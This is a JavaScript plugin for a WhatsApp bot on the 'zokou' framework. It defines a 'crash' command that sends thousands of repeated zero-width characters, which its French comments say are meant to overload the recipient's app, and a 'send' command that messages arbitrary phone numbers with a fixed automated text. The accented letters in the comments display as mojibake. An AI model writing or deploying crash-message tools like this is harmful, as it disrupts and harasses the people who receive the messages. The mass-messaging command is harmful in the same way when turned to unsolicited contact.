const { zokou } = require("../framework/zokou");

zokou({ nomCom: "crash", categorie: "MON-BOT" }, async (dest, zk, commandeOptions) => {
  const { repondre, args } = commandeOptions; // On extrait les arguments
  
  // V√©rifie si un nombre de r√©p√©titions est fourni
  const repetitions = args[0] && !isNaN(args[0]) ? Math.min(parseInt(args[0]), 10000) : 5000;
  
  // Texte sp√©cifique √† r√©p√©ter pour provoquer une surcharge
  const texteCrash = "\u200B".repeat(repetitions) + "üí•"; // Utilisation de caract√®res invisibles

  try {
    // Envoi du message avec le texte de crash
    await repondre(texteCrash);
  } catch (error) {
    console.error(error);
    repondre("Une erreur est survenue lors de la g√©n√©ration du message.");
  }
});

zokou({ nomCom: "send", categorie: "MON-BOT" }, async (dest, zk, commandeOptions) => {
  const { ms, repondre, args } = commandeOptions; // On extrait les arguments
  
  // V√©rifie si un num√©ro est fourni
  if (!args[0]) {
    return repondre("Veuillez fournir un num√©ro de t√©l√©phone apr√®s la commande. Exemple : /send +2250154191194");
  }
  
  const numero = args[0].replace(/[^0-9]/g, ''); // Nettoyage du num√©ro pour garder uniquement les chiffres
  
  // V√©rification de la longueur du num√©ro
  if (numero.length < 8) {
    return repondre("Num√©ro invalide. Veuillez v√©rifier le format.");
  }
  
  const messageSpecifique = "Ceci est un message automatique de votre bot !"; // Message √† envoyer
  
  try {
    // Envoi du message au num√©ro indiqu√©
    await zk.sendMessage(numero + "@s.whatsapp.net", { text: messageSpecifique });
    repondre(`Message envoy√© avec succ√®s au num√©ro : ${args[0]}`);
  } catch (error) {
    console.error(error);
    repondre("Une erreur est survenue lors de l'envoi du message. Veuillez v√©rifier le num√©ro.");
  }
});
